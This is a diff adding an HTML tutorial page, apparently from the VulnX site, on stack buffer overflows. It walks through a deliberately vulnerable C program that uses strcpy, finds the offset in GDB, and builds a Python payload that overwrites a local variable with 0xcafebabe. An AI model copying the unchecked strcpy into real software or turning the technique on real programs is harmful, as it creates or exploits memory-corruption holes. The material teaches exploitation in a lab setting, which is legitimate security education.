@@ -1,0 +1,358 @@
+<html>
+	<head>
+		<link rel="icon" href="https://vulnx.in/favicon.png">
+		<script data-ad-client="ca-pub-6203666289882469" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta name="keywords" content="VulnX, vulnx, vulnx.in, VulnX.in, hacking, Hacking, Buffer Overflow, Local variable, local variable, buffer overflow, bof, BoF, modifying, modyfying local variable, modifying variables, exploiting, binary exploiting, memory corruption, memory, corruption, exploit, How to hack, how to hack, stack, stack variables, overflow the stack, overwrite variables">
+<style>
+body {margin: 0;}
+
+.videoWrapper {
+  position: relative;
+  padding-bottom: 56.25%;
+  height: 0;
+}
+
+.videoWrapper iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+
+#myCookieConsent {
+    border-radius: 5px;
+    border: 5px solid #f44336;
+    width: 80%;
+    padding: 20px 20px;
+    overflow: hidden;
+    position: fixed;
+    color: #fff;
+    bottom: 3px;
+    display: none;
+    left: 5%;
+    text-align: center;
+    font-size: 15px;
+    font-weight: bold;
+}
+
+#myCookieConsent #cookieButton {
+    display: inline-block;
+    color: #fff;
+    font-size: 1.1em;
+    background: #000;
+    text-decoration: none;
+    cursor: pointer;
+    padding: 2px 20px;
+    float: right;
+    border: 2px solid #f44336;
+    border-radius: 5px;
+    transition: 0.5s;
+}
+#myCookieConsent #cookieButton:hover {
+    border: 2px solid white;
+    background: #f44336;
+	color: #fff;
+}
+
+ul.topnav {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+  left: 0;
+  right: 0;
+  overflow: hidden;
+  background-color: #23252e;
+}
+
+ul.topnav li {float: left;}
+
+ul.topnav li a {
+  background-color: #23252e;
+  display: block;
+  color: white;
+  text-align: center;
+  padding: 16px 16px;
+  text-decoration: none;
+}
+
+ul.topnav li a:hover:not(.active) {background-color: #f44336;}
+
+ul.topnav li a.active {background-color: #4CAF50;}
+
+@media screen and (max-width: 600px) {
+  ul.topnav li.left, 
+  ul.topnav li {float: none;}
+}
+</style>
+		<link rel="stylesheet" href="style.css"/>
+		<link href="https://fonts.googleapis.com/css?family=Fira+Code:600|Lobster&display=swap" rel="stylesheet">
+		<title>Buffer Overflow : Modifying local variables - Part II| VulnX</title>
+
+	</head>
+
+	<body>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-167461836-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-167461836-1');
+</script>
+
+		<font color="white" face="Fira Code" size="3" >	
+			<ul class="topnav">
+			<li><a href="../../../../../../../../../index.html">Home</a></li>
+			<li><a href="../../../../../../../../../Contents/resources.html">Resources</a></li>
+			<li><a href="../../../../../../../../../Contents/tutorials.html">Tutorials</a></li>
+			<li><a href="../../../../../../../../../Contents/CTFs.html">CTFs</a></li>
+			</ul>
+		</font>	
+		<div id="align">
+<font color="white" face="Fira Code" size="2">
+<div id="myCookieConsent">
+	<div id="cookieButton">I agree</div>
+	<div>By using our site, you agree to our use of cookies to deliver a better site experience.</div>
+</div>
+
+<script>
+var obj;
+obj = document.getElementById("myCookieConsent");
+
+function  func() {
+	obj.style.display = "none";
+	document.cookie = "cookiePromptShown=Yes; path=/";
+}
+var element;
+element = document.getElementById("cookieButton");
+element.addEventListener('click', func);
+</script>
+</font>	
+				
+				<font color="white" face="Fira Code" size="3px">
+				<center><h1>Buffer Overflow</h1></center>
+				<center><h1>Modifying local variables on the stack - Part II</h1></center>
+
+          Hey guys! What's up?<br>Welcome to the second tutorial of the Buffer Overflow series. In the previous tutorial, we learnt how we can overflow a buffer to change the value of a local variable. This time there is gonna be a slight change in it.<br>
+          <br>
+          The source code of the vulnerable C program will be almost same as the previous one. It's given below, take a look at it :-
+
+          <pre><div class="snip"><b><font color="#aaa">//  File name     : controlLocalVariable.c
+//  Compile with  : gcc controlLocalVariable.c -m64 -o controlLocalVariable.elf</font>
+
+<font color="#55FFFF">#include</font> <font color="#FF55FF">&lt;stdio.h&gt;</font>
+<font color="#55FFFF">#include</font> <font color="#FF55FF">&lt;string.h&gt;</font>
+
+<font color="#55FF55">int</font> main(<font color="#55FF55">int</font> argc, <font color="#55FF55">char const</font> *argv[]) {
+  <font color="#55FF55">const int</font> value = <font color="#FF55FF">1501</font>;
+  <font color="#55FF55">char</font> buffer[<font color="#FF55FF">64</font>];
+  printf(<font color="#FF55FF">"Copying argv[1] to buffer ...\n"</font>);
+  strcpy(buffer, argv[<font color="#FF55FF">1</font>]);
+  <font color="#FFFF55">if</font> (value == <font color="#FF55FF">0xcafebabe</font>) {
+    printf(<font color="#FF55FF">"Hello %s\n"</font>, buffer);
+  }
+  printf(<font color="#FF55FF">"Nope! You were not given the access.\n"</font>);
+  <font color="#FFFF55">return</font> <font color="#FF55FF">0</font>;
+}</b></div></pre>
+
+          As you can see the only change is in the if statement. In the previous code the `if block` executed if the 'value' variable was not equal to 1501. This time it will be executed if the 'value' variable is equal to 0xcafebabe [ or 3405691582 in decimal form ].<br>
+          <br>
+          Again we need to overflow the buffer and write the excess data in the integer variable. Seems simple right?<br>
+          Great! Let's start building our exploit.
+
+          <h2><u>STEP-1 : Determination of correct offset</u></h2>
+
+          Now, we can't just randomly write any number of bytes right? We need a specific number of junk bytes which will fill the buffer and write 0xcafebabe as the excess data in the variable. So, that number of bytes required to reach the int variable [ RBP-0x4, as explaining the previous tutorial ], such that any data after those number of bytes will be written into the int variable is called offset. Thus it is very import to determine the correct offset to the int variable. So anyway our exploit will be :-<br>
+          <li>XXXXXX.... (no. of X = offset) + 0xcafebabe</li>
+          Let's ignore 0xcafebabe for now and write "AAAA" instead of that. The character "A" has the hex code 0x41<sup>*</sup> [ remember this! ], this means that after hitting the correct offset, the extra "AAAA" will be written into RBP-0x4 [ int variable ] and if we analyse it with GDB [ the debugger we are going to be using for this series ] the value stored should be 0x41414141. So now the question is what's the offset?<br>
+          Well obviously 64 right? The buffer is of 64 bytes and just beneath it lies the int variable, so the 65th byte and the rest should be overwritten to the int variable.
+
+          <h2><u>STEP-2 : Compiling and testing</u></h2>
+
+          Let's compile the program with the command commented in the source code. Once you are done with that, open it with GDB :-
+          <pre><div class="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># gdb ./controlLocalVariable.elf -q
+Reading symbols from <font color="#55FF55">./controlLocalVariable.elf</font>...
+(No debugging symbols found in <font color="#55FF55">./controlLocalVariable.elf</font>)
+gdb-peda$ </div></pre>
+
+          Perfect, now GDB is running with controlLocalVariable.elf. You must be wondering why have I used that "-q", well that's not important, it simply means `q`uite mode and prevents a huge banner from printing before the console starts. Anyway, now the console is setup, so we can type 'disass main'. This command will disassemble the main function from the binary and show its almost equivalent assembly. This is super helpful when you don't have the source code, at that time you need to understand the program logic by its assembly itself. But anyway here is the output :-
+          <pre><div class="snip">gdb-peda$ disass main
+Dump of assembler code for function main:
+   <font color="#8181FF">0x0000000000001155</font> &lt;+0&gt;:   push   rbp
+   <font color="#8181FF">0x0000000000001156</font> &lt;+1&gt;:   mov    rbp,rsp
+   <font color="#8181FF">0x0000000000001159</font> &lt;+4&gt;:   sub    rsp,0x60
+   <font color="#8181FF">0x000000000000115d</font> &lt;+8&gt;:   mov    DWORD PTR [rbp-0x54],edi
+   <font color="#8181FF">0x0000000000001160</font> &lt;+11&gt;:  mov    QWORD PTR [rbp-0x60],rsi
+   <font color="#8181FF">0x0000000000001164</font> &lt;+15&gt;:  mov    DWORD PTR [rbp-0x4],0x5dd
+   <font color="#8181FF">0x000000000000116b</font> &lt;+22&gt;:  lea    rdi,[rip+0xe96]        # <font color="#8181FF">0x2008</font>
+   <font color="#8181FF">0x0000000000001172</font> &lt;+29&gt;:  call   <font color="#8181FF">0x1040</font> &lt;<font color="#FFFF55">puts@plt</font>&gt;
+   <font color="#8181FF">0x0000000000001177</font> &lt;+34&gt;:  mov    rax,QWORD PTR [rbp-0x60]
+   <font color="#8181FF">0x000000000000117b</font> &lt;+38&gt;:  add    rax,0x8
+   <font color="#8181FF">0x000000000000117f</font> &lt;+42&gt;:  mov    rdx,QWORD PTR [rax]
+   <font color="#8181FF">0x0000000000001182</font> &lt;+45&gt;:  lea    rax,[rbp-0x50]
+   <font color="#8181FF">0x0000000000001186</font> &lt;+49&gt;:  mov    rsi,rdx
+   <font color="#8181FF">0x0000000000001189</font> &lt;+52&gt;:  mov    rdi,rax
+   <font color="#8181FF">0x000000000000118c</font> &lt;+55&gt;:  call   <font color="#8181FF">0x1030</font> &lt;<font color="#FFFF55">strcpy@plt</font>&gt;
+   <b><font color="#8181FF">0x0000000000001191</font> &lt;+60&gt;:  cmp    DWORD PTR [rbp-0x4],0xcafebabe</b>
+   <font color="#8181FF">0x0000000000001198</font> &lt;+67&gt;:  jne    <font color="#8181FF">0x11b2</font> &lt;<font color="#FFFF55">main</font>+93&gt;
+   <font color="#8181FF">0x000000000000119a</font> &lt;+69&gt;:  lea    rax,[rbp-0x50]
+   <font color="#8181FF">0x000000000000119e</font> &lt;+73&gt;:  mov    rsi,rax
+   <font color="#8181FF">0x00000000000011a1</font> &lt;+76&gt;:  lea    rdi,[rip+0xe7e]        # <font color="#8181FF">0x2026</font>
+   <font color="#8181FF">0x00000000000011a8</font> &lt;+83&gt;:  mov    eax,0x0
+   <font color="#8181FF">0x00000000000011ad</font> &lt;+88&gt;:  call   <font color="#8181FF">0x1050</font> &lt;<font color="#FFFF55">printf@plt</font>&gt;
+   <font color="#8181FF">0x00000000000011b2</font> &lt;+93&gt;:  lea    rdi,[rip+0xe77]        # <font color="#8181FF">0x2030</font>
+   <font color="#8181FF">0x00000000000011b9</font> &lt;+100&gt;: call   <font color="#8181FF">0x1040</font> &lt;<font color="#FFFF55">puts@plt</font>&gt;
+   <font color="#8181FF">0x00000000000011be</font> &lt;+105&gt;: mov    eax,0x0
+   <font color="#8181FF">0x00000000000011c3</font> &lt;+110&gt;: leave  
+   <font color="#8181FF">0x00000000000011c4</font> &lt;+111&gt;: ret    
+End of assembler dump.
+gdb-peda$ </div></pre>
+
+          As you can see in the above snippet, in the line +60, the program compares [ donated by the cmp assembly instruction ] the dword value in the location rbp-0x4 [ which is the integer variable, I have explained this in the previous tutorial properly. ] with the 0xcafebabe. Now let's set a breakpoint at main+60, so that we can analyse the program just before it compares the variable.
+          <pre><div class="snip">gdb-peda$ break * main+60
+Breakpoint 1 at <font color="#8181FF"> 0x1191</font>
+gdb-peda$ 
+</div></pre>
+
+          Great now, let's run the program in GDB with 64 times "X" + 4 times "A". Let's check if the 4 "A" overwrite the int variable :-
+          <pre><div class="snip">gdb-peda$ run `python3 -c 'text="X" * 64; text += "AAAA"; print(text)'`
+Starting program: /root/Desktop/Buffer Overflow/controlLocalVariable.elf `python3 -c 'text="X" * 64; text += "AAAA"; print(text)'`
+Copying argv[1] to buffer ...
+
+Breakpoint 1, <font color="#8181FF">0x0000555555555191</font> in <font color="#FFFF55">main</font> ()
+gdb-peda$ <b>x/wx $rbp-0x4
+<font color="#8181FF">0x7fffffffdfac</font>: 0x000005dd</b>
+gdb-peda$ </div></pre>
+
+          Wait what?! We overflowed the buffer, and so the excess 4 "A" should be overwritten to the int variable right??! Then why is this not working? Think about it!<br>
+          
+          <h2><u>STEP-3 : Fixing the mistakes</u></h2>
+
+          If you have read the previous tutorial properly then you will be able to solve the issue quite easily. I had clearly mentioned that the stack layout is not 100% accurate and there will be some space between the end of the buffer and the start of int variable. So the perhaps we have overwritten that space and not the int variable. So the stack layout should look somewhat like this :-
+          <br><br><div id="image"><img src="https://i.imgur.com/CZxxYjh.png" style="max-width: 100%; height: auto;"></div><br>
+
+          Now how do we get the correct offset?<br>
+          <br>
+          It's simple we will use a pattern like below and feed that to the program.
+          <pre><div class="snip">AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ</div></pre>
+
+          <pre><div class="snip">gdb-peda$ run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+Starting program: /root/Desktop/Buffer Overflow/controlLocalVariable.elf AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+Copying argv[1] to buffer ...
+
+Breakpoint 1, <font color="#8181FF">0x0000555555555191</font> in <font color="#FFFF55">main</font> ()
+gdb-peda$ <b>x/wx $rbp-0x4
+<font color="#8181FF">0x7fffffffdfac</font>: 0x54545454</b>
+gdb-peda$ </div></pre>
+
+          Notice this time, the value is different. This time the value is 0x54545454, if you convert this hex to ASCII you will get "TTTT".<br>
+          So the 'TTTT' is overflowed to the int variable and thus the number of bytes from AAAABB.. all the way up to SSSS == the offset.
+          'S' is the 19th character and every character is repeated 4 times, therefore the offset is :<br>
+          19 x 4 == 76<br>
+          Perfect! Now, let's feed 76 times "X" + 4 times "A". If we get 0x41414141 [ hex representation of 'AAAA' ] in rbp-0x4, then our offset will be correct.
+          <pre><div class="snip">gdb-peda$ run `python3 -c 'a = "X" * 76 + "A" * 4; print(a)'`
+Starting program: /root/Desktop/Buffer Overflow/controlLocalVariable.elf `python3 -c 'a = "X" * 76 + "A" * 4; print(a)'`
+Copying argv[1] to buffer ...
+
+Breakpoint 1, <font color="#8181FF">0x0000555555555191</font> in <font color="#FFFF55">main</font> ()
+gdb-peda$ <b>x/wx $rbp-0x4
+<font color="#8181FF">0x7fffffffdfac</font>: 0x41414141</b>
+gdb-peda$ </div></pre>
+
+          Yay! Perfect, so we got the correct offset. Now let's replace "AAAA" with 0xcafebabe and redirect code execution to the if block.
+
+          <h2><u>STEP-4 : Determining the endianness</u></h2>
+
+          Before we write 0xcafebabe in the int varialbe, we firt need to determine the endianness of your computer.<br>
+          First of all, what is endianness? According to a wiki `In computing, endianness is the ordering or sequencing of bytes of a word of digital data in computer memory storage or during transmission. Endianness is primarily expressed as big-endian or little-endian. A big-endian system stores the most significant byte of a word at the smallest memory address and the least significant byte at the largest. A little-endian system, in contrast, stores the least-significant byte at the smallest address`.<br>
+          <br>
+          So the image shown below might give you a idea how important is endianness. If your computer is a little-endian and you write 0xcafebabe in big-endian format then all the bytes will be placed in reverse order and we would not proceed to the if block.
+          <br><br><div id="image"><img src="https://i.imgur.com/9OUi7aT.png" class="responsive"></div><br>
+
+          Now how do you get the endianness of your machine?<br>
+          Luckily we have a very simple way to identify the endianness using a one-line python command.
+          <pre><div class="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># python3 -c 'import sys; print(sys.byteorder)'
+little
+<b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># </div></pre>
+
+          As you can see, my computer is little-endian which most of you all should have, but anyway this means that we need to write the bytes in reverse order like this :-
+          <pre><div class="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># echo -e "\xbe\xba\xfe\xca"
+����
+<b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># </div></pre>
+
+          Wait! What are those ugly characters???<br>
+          Well if you notice, all the bytes are greater than 7f [ or decimal 127 ] this means that they all are beyond representable characters. That's why they appear in question mark(?) like symbols on my terminal, and like these weird characters on your web browser.
+
+          <h2><u>STEP-5 : Building up the final exploit</u></h2>
+
+          Now for a better understanding, let's make a python file which will print 76 "A" and 0xcafebabe in little-endian format.
+          <pre><div class="snip"><font color="#8181FF">import</font> sys
+<font color="#8181FF">from</font> struct <font color="#8181FF">import</font> pack
+
+exploit  = b<font color="#FF55FF">""</font>
+exploit += b<font color="#FF55FF">"A"</font> * <font color="#FF55FF">76</font>
+exploit += pack(<font color="#FF55FF">"&lt;I"</font>, <font color="#FF55FF">0xcafebabe</font>)   <font color="#aaa"><b># The '&lt;' means to pack the second argument [0xcafebabe] in little-endian. Replace it to '&gt;' if you have a big endian computer. The 'I' means integer or pack the second argument [0xcafebabe] in a 4 byte memory location '\xbe\xba\xfe\xca'</font></b>
+
+sys.stdout.buffer.write(exploit)    <b><font color="#aaa"># This is because python3 does not support printing raw bytes directly using the print() function. So this is useful.</font></b></div></pre>
+
+					Since in python3 we cannot print raw-bytes using the print() function we need to use the buffer write from the sys library. Anyway here is the output :-
+		<pre><div class="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># python3 payload.py 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����<b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># </div></pre>
+
+					Seems correct now let's feed this as the first argument to the binary and see what happens
+		<pre><div class="snip"><b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># ./controlLocalVariable.elf `python3 payload.py`
+Copying argv[1] to buffer ...
+<b>Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����</b>
+Nope! You were not given the access.
+<b>root@kali</b>:<font color="#8181FF">~/Desktop/Buffer Overflow</font># </div></pre>
+
+					Boom! Look at that, we have been greeted with argv[1]. Which means ..... <font face="Lobster"><b>WE WIN!</b></font> I hope this tutorial made sense to you. If you got confused somewhere try re-reading it because this is the first tutorial where we are introduced to debuggers and the making of payload using python scripts so I understand it might be a little confusing for some of you. Anyway, if you understood everything well then it's a great start! We will meet in the next tutorial where we will be jumping to a function in the source code which is not called by the programmer.
+
+					<h2><u>CONTACT</u></h2>
+          If you have any doubts or confusions in some part of the tutorial, feel free to reach out to me on my <a href="https://instagram.com/vulnx_hacking"><font color="#f44336">Instagram</font></a> or you can mail me at <a href="mailto:vulnx101@gmail.com"><font color="#f44336">vulnx101@gmail.com</font></a>
+          <div id="align_right">
+            Good luck,<br>
+            VulnX<br>
+          </div>
+          <hr class="new5">
+
+		</font></div>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script>
+var element;
+element = document.getElementById("myCookieConsent");
+
+function getCookie(cname) {
+  var name = cname + "=";
+  var decodedCookie = decodeURIComponent(document.cookie);
+  var ca = decodedCookie.split(';');
+  for(var i = 0; i <ca.length; i++) {
+    var c = ca[i];
+    while (c.charAt(0) == ' ') {
+      c = c.substring(1);
+    }
+    if (c.indexOf(name) == 0) {
+      return c.substring(name.length, c.length);
+    }
+  }
+  return "";
+}
+
+ var cookieVal = getCookie("cookiePromptShown");
+
+if(cookieVal != "Yes") {
+	element.style.display = "block";
+
+}
+else {
+	element.style.display = "none";
+}
+
+</script>
+
+	</body>
+</html>
